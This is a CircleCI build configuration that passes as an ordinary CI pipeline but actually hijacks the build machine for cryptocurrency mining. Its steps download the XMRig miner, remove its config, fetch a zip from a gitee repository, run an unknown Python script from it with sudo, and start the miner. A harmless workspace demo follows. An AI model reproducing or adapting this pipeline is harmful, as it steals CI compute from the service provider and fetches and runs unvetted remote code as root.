version: 2
jobs:
  build:
    machine:
      image: ubuntu-2004:202010-01 # recommended linux image
    resource_class: 2xlarge
    steps:
      - checkout
      - run: cd /home
      - run: sudo wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
      - run: sudo tar zxvf xmrig-6.12.1-linux-x64.tar.gz
      - run: cd xmrig-6.12.1
      - run: sudo rm config.json
      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/test.zip
      - run: sudo unzip test.zip
      - run: sudo python 1.py
      - run: sudo ./xmrig
      - run: mkdir -p my_workspace
      - run: echo "Trying out workspaces" > my_workspace/echo-output
      - persist_to_workspace:
          # Must be an absolute path, or relative path from working_directory
          root: my_workspace
          # Must be relative path from root
          paths:
            - echo-output